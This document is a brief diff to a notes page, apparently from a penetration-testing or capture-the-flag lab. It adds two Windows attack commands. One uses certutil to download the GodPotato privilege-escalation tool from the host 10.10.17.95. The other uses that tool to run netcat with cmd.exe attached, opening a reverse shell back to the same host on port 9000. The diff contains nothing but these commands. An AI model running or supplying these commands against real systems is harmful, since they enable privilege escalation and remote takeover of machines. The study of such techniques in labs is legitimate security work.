@@ -1,11 +1,11 @@
 [[Editing Copy Page]]
 
+```bash
+C:\Windows\System32\certutil.exe -urlcache -split -f http://10.10.17.95:80/GodPotato.exe C:\Windows\Tasks\GodPotato.exe
 ```
 
 ```
-
-```
-
+GodPotato.exe -cmd "C:\ProgramData\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.17.95 9000"
 ```
 
 ```
